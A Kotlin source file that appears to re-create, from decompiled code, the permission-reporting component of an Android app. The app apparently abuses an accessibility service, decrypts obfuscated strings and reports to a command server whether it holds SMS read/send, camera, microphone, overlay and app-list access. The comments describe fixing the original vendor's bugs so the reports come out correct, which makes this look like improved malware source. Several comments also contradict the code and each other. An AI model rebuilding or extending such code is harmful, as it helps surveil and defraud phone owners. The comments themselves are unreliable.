package com.storm.safe.rock.p000

import android.content.Context
import android.os.Build
import android.os.Environment
import android.provider.Settings
import androidx.core.app.NotificationManagerCompat
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.util.StringUtil

/**
 * JADX: p000/an0.java — Permission status collector.
 *
 * Collects 11 permission/feature statuses as Map<String, Boolean>.
 * Used by AppCommandHandler.handleGetPermissions to report device permissions to server.
 *
 * Key methods:
 * - m209824a0(context) → collectAll(context)
 *
 * Static fields:
 * - f43729a0 → PREFS_NAME (SharedPreferences name for appList permission)
 */

/**
 * Interface for permission collection.
 * vendor: an0 is abstract, we extract an interface for testability.
 */
interface PermissionProvider {
    fun collectAll(context: Context): Map<String, Boolean>
}

/**
 * JADX: an0 — singleton permission collector.
 *
 * Replicates vendor an0.m209824a0 logic with one bug fix:
 * - SDK version branching that appears inverted relative to Android standard (faithfully replicated)
 * - ADAPT: vendor uses !=0 for contacts/readSms/sendSms/camera/microphone (bug — inverted grant check), fixed to ==0
 * - accessibility detection via Settings.Secure enabled_accessibility_services
 */
object PermissionCollector : PermissionProvider {

    /**
     * JADX: an0.f43729a0 = StringUtil.m212470a0("O1wDN0QrHydYPxRKBTtZLR8=")
     * Decrypts to "permission_status" — SharedPreferences name for appList permission.
     */
    @JvmStatic
    val PREFS_NAME: String = StringUtil.decrypt("O1wDN0QrHydYPxRKBTtZLR8=")

    /**
     * vendor: dqtvuisjd.class.getName() — the accessibility service class name.
     */
    @JvmStatic
    val SERVICE_CLASS_NAME: String = MyAccessibilityService::class.java.name

    /**
     * JADX: an0.m209824a0(context) — collect all 11 permission statuses.
     *
     * vendor source (an0.java line 50-86):
     * 1. accessibility — check enabled_accessibility_services contains packageName/dqtvuisjd or just dqtvuisjd
     * 2. overlay — Settings.canDrawOverlays(context)
     * 3. notification — SDK<33: checkPerm(POST_NOTIFICATIONS)==0; SDK>=33: NotifManager.areNotificationsEnabled()
     * 4. photo — SDK>=33: checkPerm(READ_EXTERNAL_STORAGE)==0; SDK<33: checkPerm(READ_MEDIA_IMAGES)==0
     * 5. contacts — checkPerm(READ_CONTACTS) == 0  (ADAPT: vendor uses != 0, bug fixed)
     * 6. readSms — checkPerm(READ_SMS) == 0  (ADAPT: vendor uses != 0, bug fixed)
     * 7. sendSms — checkPerm(SEND_SMS) == 0  (ADAPT: vendor uses != 0, bug fixed)
     * 8. camera — checkPerm(CAMERA) == 0  (ADAPT: vendor uses != 0, bug fixed)
     * 9. microphone — checkPerm(RECORD_AUDIO) == 0  (ADAPT: vendor uses != 0, bug fixed)
     * 10. storage — SDK<30: Environment.isExternalStorageManager(); SDK>=30: checkPerm(WRITE_EXTERNAL_STORAGE)==0
     * 11. appList — SDK<30: SharedPrefs(PREFS_NAME).getBoolean("app_list_permission", false); SDK>=30: true
     */
    override fun collectAll(context: Context): Map<String, Boolean> {
        // vendor: StringUtil.m212470a0("KloSP14rBSxePSJNCA==") → "accessibility"
        // ADAPT: We use the decrypted key directly since the map key is always "accessibility"
        val accessibilityKey = "accessibility"

        // === 1. accessibility ===
        var accessibilityEnabled = false
        try {
            val serviceName = SERVICE_CLASS_NAME
            val fullComponent = context.packageName + "/" + serviceName
            var enabledServices = Settings.Secure.getString(
                context.contentResolver,
                "enabled_accessibility_services"
            )
            if (enabledServices == null) {
                enabledServices = ""
            }
            // vendor: AbstractC0779a1.m213652a5(string, str, false) — kotlin.text.contains(ignoreCase=false)
            if (enabledServices.contains(fullComponent, ignoreCase = false) ||
                enabledServices.contains(serviceName, ignoreCase = false)
            ) {
                accessibilityEnabled = true
            }
        } catch (_: Exception) {
            // vendor: catch (Exception unused) {} — silently ignore
        }

        // === 2. overlay ===
        val overlayEnabled = Settings.canDrawOverlays(context)

        // === 3. notification ===
        // vendor line 72: Build.VERSION.SDK_INT < 33
        //   ? AbstractC1117qo.m214411a7(context, "android.permission.POST_NOTIFICATIONS") == 0
        //   : mk0.m214005a0(new nk0(context).f58645a0)
        // i.e. SDK < 33 → checkPerm(POST_NOTIFICATIONS) == 0
        //      SDK >= 33 → NotificationManagerCompat.areNotificationsEnabled()
        val notificationEnabled = if (Build.VERSION.SDK_INT < 33) {
            PermissionHelper.checkPermission(context, "android.permission.POST_NOTIFICATIONS") == 0
        } else {
            NotificationManagerCompat.from(context).areNotificationsEnabled()
        }

        val sdkInt = Build.VERSION.SDK_INT

        // === 4. photo ===
        // vendor: SDK >= 33 → READ_EXTERNAL_STORAGE, SDK < 33 → READ_MEDIA_IMAGES (inverted)
        // ADAPT: fixed — SDK >= 33 uses READ_MEDIA_IMAGES, SDK < 33 uses READ_EXTERNAL_STORAGE
        val photoEnabled = if (sdkInt >= 33) {
            PermissionHelper.checkPermission(context, "android.permission.READ_MEDIA_IMAGES") == 0
        } else {
            PermissionHelper.checkPermission(context, "android.permission.READ_EXTERNAL_STORAGE") == 0
        }

        // === 5-9. Permission checks ===
        // ADAPT: vendor uses != 0 (bug — granted=0 makes != 0 return false for granted permissions)
        // Fixed to == 0 so granted permissions correctly report true
        val contactsEnabled = PermissionHelper.checkPermission(context, "android.permission.READ_CONTACTS") == 0
        val readSmsEnabled = PermissionHelper.checkPermission(context, "android.permission.READ_SMS") == 0
        val sendSmsEnabled = PermissionHelper.checkPermission(context, "android.permission.SEND_SMS") == 0
        val cameraEnabled = PermissionHelper.checkPermission(context, "android.permission.CAMERA") == 0
        val microphoneEnabled = PermissionHelper.checkPermission(context, "android.permission.RECORD_AUDIO") == 0

        // === 10. storage ===
        // vendor: SDK < 30 → isExternalStorageManager(), SDK >= 30 → WRITE_EXTERNAL_STORAGE (inverted)
        // ADAPT: fixed — SDK >= 30 uses isExternalStorageManager(), SDK < 30 uses WRITE_EXTERNAL_STORAGE
        val storageEnabled = if (sdkInt >= 30) {
            try {
                Environment.isExternalStorageManager()
            } catch (_: Throwable) {
                false
            }
        } else {
            PermissionHelper.checkPermission(context, "android.permission.WRITE_EXTERNAL_STORAGE") == 0
        }

        // === 11. appList ===
        // vendor: SDK < 30 → SharedPrefs(PREFS_NAME).getBoolean("app_list_permission", false)
        //         SDK >= 30 → true
        val appListEnabled = if (sdkInt < 30) {
            try {
                context.getSharedPreferences(PREFS_NAME, 0)
                    .getBoolean("app_list_permission", false)
            } catch (_: Exception) {
                false
            }
        } else {
            true
        }

        // vendor: AbstractC0770a1.m213614f9(...) — kotlin.collections.mapOf(vararg Pair)
        return mapOf(
            accessibilityKey to accessibilityEnabled,
            "overlay" to overlayEnabled,
            "notification" to notificationEnabled,
            "photo" to photoEnabled,
            "contacts" to contactsEnabled,
            "readSms" to readSmsEnabled,
            "sendSms" to sendSmsEnabled,
            "camera" to cameraEnabled,
            "microphone" to microphoneEnabled,
            "storage" to storageEnabled,
            "appList" to appListEnabled
        )
    }
}
